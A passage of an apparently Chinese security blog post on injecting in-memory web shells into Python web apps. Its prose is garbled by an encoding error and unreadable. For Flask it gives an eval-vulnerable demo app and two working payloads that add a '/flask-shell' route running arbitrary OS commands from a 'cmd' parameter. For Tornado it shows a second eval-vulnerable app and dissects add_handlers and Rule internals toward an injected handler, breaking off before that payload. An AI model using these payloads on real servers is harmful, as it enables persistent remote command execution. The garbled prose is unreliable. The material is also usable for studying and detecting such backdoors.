<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">template</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú® <code>eval</code> Âú∫ÊôØ‰∏ãÔºåÊ≤°ÊúâÂäûÊ≥ïÊâßË°åÂ§öÊù°‰ª£Á†ÅÔºåÊâÄ‰ª•ËøôÈáåÈúÄË¶ÅÂèëÈÄÅ‰∏§Êù°ËØ∑Ê±ÇÊù•ÂÆåÊàêÊìç‰ΩúÔºåÂΩìÂâç‰∏ä‰∏ãÊñá‰∏≠ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® <code>app</code> ÂØπË±°ÔºåÊûÑÈÄ†Á¨¨‰∏ÄÊù°ËØ∑Ê±ÇÂêë <code>url_map</code> ‰∏≠Êñ∞Â¢û‰∏ÄÊù° <code>UrlRule</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">url_map</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">url_rule_class</span><span class="p">(</span><span class="s1">&#39;/flask-shell&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">],</span><span class="n">endpoint</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏™Êó∂ÂÄôÂ∑≤ÁªèÂèØ‰ª•ËÆøÈóÆ <code>/flask-shell</code> Ë∑ØÁî±Ôºå‰ΩÜÊòØÁî±‰∫é <code>view_functions</code> ‰∏≠Âπ∂‰∏çÂ≠òÂú®Ë∑ØÁî±ÊåáÂÆöÁöÑ <code>endpoint</code> ÊâÄ‰ª•‰ºöÊä•Èîô„ÄÇ</p>
<p>‰πãÂêéÂÜçÊûÑÈÄ†Á¨¨‰∫åÊù°ËØ∑Ê±ÇÔºåÂêë <code>view_functions</code> ‰∏≠Â¢ûÂä†ÂØπÂ∫î <code>endpoint</code> ÁöÑÂÆûÁé∞„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;shell&#39;</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request_context</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏∫‰∫ÜÁÅµÊ¥ªÊÄßËøôÈáåÈúÄË¶Åhttp‰º†ÂèÇÊù•ÊéßÂà∂ÊâßË°åÁöÑÂëΩ‰ª§Ôºå‰ΩÜÊòØËøôÈáå‰ºöÂèëÁé∞‰∏ä‰∏ãÊñá‰∏≠Âπ∂‰∏çÂ≠òÂú® <code>request_context</code>ÔºåÂΩìÂâç <code>app</code> ÂØπË±°‰∏≠ÁöÑ <code>request_context</code> ÊòØ‰∏Ä‰∏™ÂáΩÊï∞„ÄÇ</p>
<p>ÈÇ£‰πàÂèØ‰ª•ÈÄöËøáÂáΩÊï∞ÁöÑ <code>__globals__</code> Â±ûÊÄßÊù•Ëé∑ÂèñÂΩìÂâçÁöÑÂÖ®Â±ÄÂèòÈáèÂ≠óÂÖ∏ÔºåÂú®ËøôÂÖ∂‰∏≠Â∞±ÊúâÈúÄË¶ÅÁöÑ <code>RequestContext</code> ÂØπË±°„ÄÇ</p>
<p>ÊâÄ‰ª•ÊúÄÁªàpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;shell&#39;</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">request_context</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request_ctx&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞Ü‰∏§Êù°payloadÂèëÈÄÅÂÆåÊàêÂêéÔºåÂç≥ÂèØÊñ∞Â¢û‰∏ÄÊù°‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÁöÑË∑ØÁî± <code>/flask-shell</code></p>
<h2 id="tornado">Tornado
</h2><p>ÂèÇËÄÉÔºö<a class="link" href="https://tiangonglab.github.io/blog/tiangongarticle038/"  target="_blank" rel="noopener"
    >Python Web ÂÜÖÂ≠òÈ©¨Â§öÊ°ÜÊû∂Ê§çÂÖ•ÊäÄÊúØËØ¶Ëß£ | Â§©Â∑•ÂÆûÈ™åÂÆ§</a></p>
<p>ÊºèÊ¥ûÁéØÂ¢É</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tornado</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MainHandler</span><span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_app</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">MainHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">autoreload</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span> <span class="o">=</span> <span class="n">make_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;listen: 5000&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tornado</span><span class="o">.</span><span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Tornado</code> ÁöÑË∑ØÁî±‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÈÉΩ‰ºöÂú®ÂÆû‰æãÂåñ <code>tornado.web.Application</code> ÁöÑÊó∂ÂÄô‰º†ÂÖ•ÔºåÊúÄÂàùÊÉ≥Âà∞ÁöÑÂäûÊ≥ïÂíå <code>flask</code> Áõ∏ÂêåÔºåËÄÉËôëÊòØÂê¶ËÉΩÊâæÂà∞ÂÖ∂‰∏≠Â≠òÊîæË∑ØÁî±ÁöÑÂàóË°®Êù•Áõ¥Êé•Êìç‰ΩúÔºåÂú®ÈòÖËØª <code>Application</code> ÁöÑ‰ª£Á†ÅÊó∂Á°ÆÂÆûÂèëÁé∞Âú®ÊûÑÈÄ†ÂáΩÊï∞‰∏≠Â≠òÂú®ËøôÊ†∑ÁöÑÂàóË°®„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">handlers</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">_RuleList</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">default_host</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">transforms</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="n">Type</span><span class="p">[</span><span class="s2">&#34;OutputTransform&#34;</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">**</span><span class="n">settings</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span> <span class="o">=</span> <span class="n">_ApplicationRouter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">handlers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">default_router</span> <span class="o">=</span> <span class="n">_ApplicationRouter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="p">,</span> <span class="p">[</span><span class="n">Rule</span><span class="p">(</span><span class="n">AnyMatches</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞Âú® <code>Application</code> Á±ª‰∏≠Â≠òÂú®‰∏Ä‰∏™Á±ª‰ºº‰∫é <code>flask</code> ‰∏≠ <code>add_url_rule</code> ÁöÑÂáΩÊï∞ <code>add_handlers</code>ÔºåËøô‰∏™ÂáΩÊï∞Áî®Êù•ÊîØÊåÅÈÖçÁΩÆËôöÊãü‰∏ªÊú∫ÔºåÂπ∂‰∏îÂú®‰πãÂêé‰ºöÂ∞ÜÊåáÂÆöÁöÑË∑ØÁî±Âä†ÂÖ•ÂΩìÂâçÁöÑË∑ØÁî±Ë°®‰∏≠„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_handlers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">host_handlers</span><span class="p">:</span> <span class="n">_RuleList</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Appends the given handlers to our handler list.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    Host patterns are processed sequentially in the order they were
</span></span></span><span class="line"><span class="cl"><span class="s2">    added. All matching patterns will be considered.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">host_matcher</span> <span class="o">=</span> <span class="n">HostMatches</span><span class="p">(</span><span class="n">host_pattern</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="n">host_matcher</span><span class="p">,</span> <span class="n">_ApplicationRouter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_handlers</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">default_router</span><span class="o">.</span><span class="n">rules</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">rule</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">default_host</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">     <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span><span class="o">.</span><span class="n">add_rules</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">[(</span><span class="n">DefaultHostMatches</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_matcher</span><span class="o">.</span><span class="n">host_pattern</span><span class="p">),</span> <span class="n">host_handlers</span><span class="p">)]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_rules</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">rules</span><span class="p">:</span> <span class="n">_RuleList</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Appends new rules to the router.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    :arg rules: a list of Rule instances (or tuples of arguments, which are
</span></span></span><span class="line"><span class="cl"><span class="s2">    passed to Rule constructor).
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rule</span> <span class="ow">in</span> <span class="n">rules</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="p">(</span><span class="nb">tuple</span><span class="p">,</span> <span class="nb">list</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">rule</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rule</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">basestring_type</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="n">PathMatches</span><span class="p">(</span><span class="n">rule</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="o">*</span><span class="n">rule</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="o">*</span><span class="n">rule</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">rules</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">process_rule</span><span class="p">(</span><span class="n">rule</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèÇÊï∞ÊûÑÈÄ†</p>
<p>È¶ñÂÖàÁúãÂà∞Ëøô‰∏™ÂáΩÊï∞Â£∞ÊòéÊé•Âèó‰∏§‰∏™ÂèÇÊï∞ <code>host_pattern</code> Âíå <code>host_handlers</code>ÔºåÂÖ∂‰∏≠ <code>host_pattern</code> ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ê≤°Êúâ‰ªÄ‰πàÈúÄË¶ÅÂ§öËÄÉËôëÁöÑÔºåËøô‰∏™Âú∫ÊôØ‰∏ãÁõ¥Êé•ÊûÑÈÄ† <code>.*</code> ÂåπÈÖçÊâÄÊúâÂüüÂêçÂç≥ÂèØÔºåËÄåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ <code>host_handlers</code> ËæÉ‰∏∫Â§çÊùÇ‰∏ÄÁÇπÔºåÁ±ªÂûã‰∏∫ <code>_RuleList</code>ÔºåÊü•Áúã‰∏Ä‰∏ãËøô‰∏™Á±ªÂûãÂÆö‰πâ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">_RuleList</span> <span class="o">=</span> <span class="n">List</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">Union</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Rule&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="p">[</span><span class="n">Any</span><span class="p">],</span>  <span class="c1"># Can&#39;t do detailed typechecking of lists.</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]],</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="nb">str</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú® <code>add_rules</code> ‰∏≠ÔºåÊï¥‰∏™‰º†ÂÖ•ÁöÑÂÄºÈÉΩ‰ºöË¢´‰Ωú‰∏∫ÊûÑÈÄ†ÂèÇÊï∞Êù•ÂÆû‰æãÂåñ‰∏Ä‰∏™ <code>Rule</code> ÂØπË±°ÔºåÊûÑÈÄ†ÂáΩÊï∞Â¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">matcher</span><span class="p">:</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_kwargs</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞Á±ªÂûã‰∏∫ <code>Matcher</code>ÔºåÂ¶ÇÊûúËá™Â∑±Êù•ÊûÑÈÄ†ÁöÑËØù‰ºöÊØîËæÉÈ∫ªÁÉ¶Ôºå‰ΩÜÊòØÁúãÂà∞ <code>add_rules</code> ‰∏≠ÁöÑÂ§ÑÁêÜÔºå‰ºöÂà§Êñ≠‰∏ÄÊ¨°‰º†ÂÖ•ÂÄºÔºåÂ¶ÇÊûúÊòØ <code>tuple</code> ÊàñËÄÖ <code>list</code> Âπ∂‰∏îÁ¨¨‰∏Ä‰∏™ÂÄºÊòØÂ≠óÁ¨¶‰∏≤ÔºåÈÇ£‰πàÂ∞±‰ºöË∞ÉÁî®‰∏ÄÊ¨° <code>PathMatches</code> ËøîÂõû‰∏Ä‰∏™ <code>Matcher</code> ÂØπË±°ÔºåÊâÄ‰ª•ËøôÈáåËÄÉËôëÁõ¥Êé•‰º†ÂÖ•Ë∑ØÁî±Â≠óÁ¨¶‰∏≤ÔºåËÆ©Á≥ªÁªüÊù•ÂÅö‰∏ÄÊ¨°Ëá™Âä®ËΩ¨Êç¢„ÄÇ</p>
<p>Êé•‰∏ãÊù•ËÄÉËôëË∑ØÁî±ÂØπÂ∫îÁöÑ <code>handler</code>, ËøôÂæÄÂæÄÈúÄË¶ÅÊòØ‰∏Ä‰∏™ <code>tornado.web.RequestHandler</code> ÁöÑÂ≠êÁ±ªÔºåÈÇ£‰πàËøôÈáåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® <code>type</code> ÂáΩÊï∞Êù•ÂàõÂª∫‰∏Ä‰∏™ÂØπÂ∫îÂü∫Á±ªÁöÑÂØπË±°ÔºåÂΩì <code>type</code> ÂáΩÊï∞Êé•Âèó‰∏â‰∏™ÂèÇÊï∞Êó∂ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Á±ªÂêçÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫Âü∫Á±ªÂÖÉÁªÑÔºåÁ¨¨‰∏â‰∏™ÂèÇÊï∞‰∏∫Á±ªÂ±ûÊÄß/ÊñπÊ≥ïÁöÑÂ≠óÂÖ∏ÔºåÂáΩÊï∞ÂéüÂûãÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@overload</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">bases</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">type</span><span class="p">,</span> <span class="o">...</span><span class="p">],</span> <span class="nb">dict</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="o">/</span><span class="p">,</span> <span class="o">**</span><span class="n">kwds</span><span class="p">:</span> <span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•‰ΩøÁî®‰∏ãÈù¢ÁöÑpayloadÂç≥ÂèØÂàõÂª∫‰∏Ä‰∏™ÂêàÊ≥ï <code>RequestHandler</code>„ÄÇ</p>
<div class="highlight"><div class="chroma">
